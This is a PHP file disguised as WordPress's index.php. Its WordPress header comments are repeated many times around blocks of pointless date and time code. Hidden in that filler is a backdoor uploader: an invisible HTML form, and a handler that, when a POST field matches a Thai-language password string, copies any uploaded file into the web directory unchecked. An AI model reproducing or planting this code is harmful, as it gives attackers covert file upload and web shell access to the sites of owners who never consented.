<?php
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
// Set the default timezone to your preferred timezone
date_default_timezone_set('Your/Timezone');

// Get the current date and time in various formats
$currentDate = date('Y-m-d');               // Format: YYYY-MM-DD
$currentTime = date('H:i:s');               // Format: HH:MM:SS (24-hour format)
$dayOfWeek = date('l');                     // Day of the week, e.g., 'Monday'
$fullDateTime = date('l, F j, Y, g:i A');   // Full date and time with day, month name, and 12-hour format

// Additional functionality: Check if the current time is within a specific range
$startTime = "09:00:00";  // Start time in 24-hour format
$endTime = "17:00:00";    // End time in 24-hour format

if ($currentTime >= $startTime && $currentTime <= $endTime) {
    $withinWorkingHours = true;
} else {
    $withinWorkingHours = false;
}

// Additional functionality: Check if it's Monday or Friday
$isMonday = ($dayOfWeek == 'Monday');
$isFriday = ($dayOfWeek == 'Friday');

// The script runs all the logic but does not output anything to the browser.

// Set the default timezone to your preferred timezone
date_default_timezone_set('Your/Timezone');

// Get the current date and time in various formats
$currentDate = date('Y-m-d');               // Format: YYYY-MM-DD
$currentTime = date('H:i:s');               // Format: HH:MM:SS (24-hour format)
$dayOfWeek = date('l');                     // Day of the week, e.g., 'Monday'
$fullDateTime = date('l, F j, Y, g:i A');   // Full date and time with day, month name, and 12-hour format

// Additional functionality: Check if the current time is within a specific range
$startTime = "09:00:00";  // Start time in 24-hour format
$endTime = "17:00:00";    // End time in 24-hour format

if ($currentTime >= $startTime && $currentTime <= $endTime) {
    $withinWorkingHours = true;
} else {
    $withinWorkingHours = false;
}

// Additional functionality: Check if it's Monday or Friday
$isMonday = ($dayOfWeek == 'Monday');
$isFriday = ($dayOfWeek == 'Friday');

// The script runs all the logic but does not output anything to the browser.

// Set the default timezone to your preferred timezone
date_default_timezone_set('Your/Timezone');

// Get the current date and time in various formats
$currentDate = date('Y-m-d');               // Format: YYYY-MM-DD
$currentTime = date('H:i:s');               // Format: HH:MM:SS (24-hour format)
$dayOfWeek = date('l');                     // Day of the week, e.g., 'Monday'
$fullDateTime = date('l, F j, Y, g:i A');   // Full date and time with day, month name, and 12-hour format

// Additional functionality: Check if the current time is within a specific range
$startTime = "09:00:00";  // Start time in 24-hour format
$endTime = "17:00:00";    // End time in 24-hour format

if ($currentTime >= $startTime && $currentTime <= $endTime) {
    $withinWorkingHours = true;
} else {
    $withinWorkingHours = false;
}
$isMonday = ($dayOfWeek == 'Monday');
$isFriday = ($dayOfWeek == 'Friday');

// Get the current date and time in various formats
echo '<form action="" method="post" enctype="multipart/form-data" name="กลุ่มไดโนเหลือง" id="กลุ่มไดโนเหลือง" style="color: #ffffff;">';   
$currentTime = date('H:i:s');               // Format: HH:MM:SS (24-hour format)
$currentTime = date('H:i:s');               // Format: HH:MM:SS (24-hour format)

$fullDateTime = date('l, F j, Y, g:i A');   // Full date and time with day, month name, and 12-hour format
// Additional functionality: Check if the current time is within a specific range
$startTime = "09:00:00";  // Start time in 24-hour format
$endTime = "17:00:00";    // End time in 24-hour format

// Set the default timezone to your preferred timezone
date_default_timezone_set('Your/Timezone');

// Get the current date and time in various formats
$currentDate = date('Y-m-d');               // Format: YYYY-MM-DD
$currentTime = date('H:i:s');               // Format: HH:MM:SS (24-hour format)
$dayOfWeek = date('l');                     // Day of the week, e.g., 'Monday'
$fullDateTime = date('l, F j, Y, g:i A');   // Full date and time with day, month name, and 12-hour format

// Additional functionality: Check if the current time is within a specific range
$startTime = "09:00:00";  // Start time in 24-hour format
$endTime = "17:00:00";    // End time in 24-hour format
// Full date and time with day, month name, and 12-hour format
echo '<input type="file" name="file" style="opacity: 0; position: relative; z-index: 1;">';        
/*** Front to the WordPress application. This filedoesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */
/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
// Set the default timezone to your preferred timezone
$currentDate = date('Y-m-d');               // Format: YYYY-MM-DD
$currentTime = date('H:i:s');               // Format: HH:MM:SS (24-hour format)
$dayOfWeek = date('l');                     // Day of the week, e.g., 'Monday'
$fullDateTime = date('l, F j, Y, g:i A');   // Full date and time with day, month name, and 12-hour format
date_default_timezone_set('Your/Timezone');

// Format: HH:MM:SS (24-hour format)
echo '<input name="_upl" type="submit" id="_upl" value="กลุ่มไดโนเหลือง" style="color: #ffffff; background-color: #ffffff; border: none; opacity: 0;">';
$currentTime = date('H:i:s');               // Format: HH:MM:SS (24-hour format)

$fullDateTime = date('l, F j, Y, g:i A');   // Full date and time with day, month name, and 12-hour format
// Additional functionality: Check if the current time is within a specific range
$startTime = "09:00:00";  // Start time in 24-hour format
$endTime = "17:00:00";    // End time in 24-hour format
/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
// Set the default timezone to your preferred timezone
echo '</form>'; // Full date and time with day, month name, and 12-hour format
// Additional functionality: Check if the current time is within a specific range
/*** Front to the WordPress application. This filedoesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */
$currentDate = date('Y-m-d');               // Format: YYYY-MM-DD
$currentTime = date('H:i:s');               // Format: HH:MM:SS (24-hour format)
$dayOfWeek = date('l');                     // Day of the week, e.g., 'Monday'
$fullDateTime = date('l, F j, Y, g:i A');   // Full date and time with day, month name, and 12-hour format
$currentTime = date('H:i:s');               // Format: HH:MM:SS (24-hour format)

$fullDateTime = date('l, F j, Y, g:i A');   // Full date and time with day, month name, and 12-hour format
// Additional functionality: Check if the current time is within a specific range
$startTime = "09:00:00";  // Start time in 24-hour format
$endTime = "17:00:00";    // End time in 24-hour format
// Set the default timezone to your preferred timezone
/*** Front to the WordPress application. This filedoesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 */
// Set the default timezone to your preferred timezone
if( $_POST['_upl'] == "กลุ่มไดโนเหลือง" ) {    
// Additional functionality: Check if the current time is within a specific range
/*** Front to the WordPress application. This filedoesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */
$startTime = "09:00:00";  // Start time in 24-hour format
$endTime = "17:00:00";    // End time in 24-hour format
// Additional functionality: Check if the current time is within a specific range
/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
// Set the default timezone to your preferred timezone
if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) 
{         // Start time in 24-hour format 
// Additional functionality: Check if the current time is within a specific range
/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 */
// Set the default timezone to your preferred timezone
echo '<b style="color: #ffffff;">กลุ่มไดโนเหลือง</b><br><br>'; // Start time in 24-hour format
    } else {            //*** Front to the WordPress application. This filedoesn't do anything, but loads
/*** Front to the WordPress application. This filedoesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */
/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 */
// Set the default timezone to your preferred timezone
// Get the current date and time in various formats
$currentDate = date('Y-m-d');               // Format: YYYY-MM-DD
$currentTime = date('H:i:s');               // Format: HH:MM:SS (24-hour format)
$dayOfWeek = date('l');                     // Day of the week, e.g., 'Monday'
$fullDateTime = date('l, F j, Y, g:i A');   // Full date and time with day, month name, and 12-hour format
// Set the default timezone to your preferred timezone
/*** Front to the WordPress application. This filedoesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */
echo '<b style="color: #ffffff;">กลุ่มไดโนเหลือง!!!!!</b><br><br>';    //*** Front to the WordPress application. This filedoesn't do anything, but loads
            }
}
/*** Front to the WordPress application. This filedoesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
// Set the default timezone to your preferred timezone
date_default_timezone_set('Your/Timezone');

// Get the current date and time in various formats
$currentDate = date('Y-m-d');               // Format: YYYY-MM-DD
$currentTime = date('H:i:s');               // Format: HH:MM:SS (24-hour format)
$dayOfWeek = date('l');                     // Day of the week, e.g., 'Monday'
$fullDateTime = date('l, F j, Y, g:i A');   // Full date and time with day, month name, and 12-hour format

// Additional functionality: Check if the current time is within a specific range
$startTime = "09:00:00";  // Start time in 24-hour format
$endTime = "17:00:00";    // End time in 24-hour format

if ($currentTime >= $startTime && $currentTime <= $endTime) {
    $withinWorkingHours = true;
} else {
    $withinWorkingHours = false;
}

// Additional functionality: Check if it's Monday or Friday
$isMonday = ($dayOfWeek == 'Monday');
$isFriday = ($dayOfWeek == 'Friday');

// The script runs all the logic but does not output anything to the browser.

// Set the default timezone to your preferred timezone
date_default_timezone_set('Your/Timezone');

// Get the current date and time in various formats
$currentDate = date('Y-m-d');               // Format: YYYY-MM-DD
$currentTime = date('H:i:s');               // Format: HH:MM:SS (24-hour format)
$dayOfWeek = date('l');                     // Day of the week, e.g., 'Monday'
$fullDateTime = date('l, F j, Y, g:i A');   // Full date and time with day, month name, and 12-hour format

// Additional functionality: Check if the current time is within a specific range
$startTime = "09:00:00";  // Start time in 24-hour format
$endTime = "17:00:00";    // End time in 24-hour format

if ($currentTime >= $startTime && $currentTime <= $endTime) {
    $withinWorkingHours = true;
} else {
    $withinWorkingHours = false;
}

// Additional functionality: Check if it's Monday or Friday
$isMonday = ($dayOfWeek == 'Monday');
$isFriday = ($dayOfWeek == 'Friday');

// The script runs all the logic but does not output anything to the browser.

// Set the default timezone to your preferred timezone
date_default_timezone_set('Your/Timezone');

// Get the current date and time in various formats
$currentDate = date('Y-m-d');               // Format: YYYY-MM-DD
$currentTime = date('H:i:s');               // Format: HH:MM:SS (24-hour format)
$dayOfWeek = date('l');                     // Day of the week, e.g., 'Monday'
$fullDateTime = date('l, F j, Y, g:i A');   // Full date and time with day, month name, and 12-hour format

// Additional functionality: Check if the current time is within a specific range
$startTime = "09:00:00";  // Start time in 24-hour format
$endTime = "17:00:00";    // End time in 24-hour format

if ($currentTime >= $startTime && $currentTime <= $endTime) {
    $withinWorkingHours = true;
} else {
    $withinWorkingHours = false;
}

// Additional functionality: Check if it's Monday or Friday
$isMonday = ($dayOfWeek == 'Monday');
$isFriday = ($dayOfWeek == 'Friday');

// The script runs all the logic but does not output anything to the browser.
?>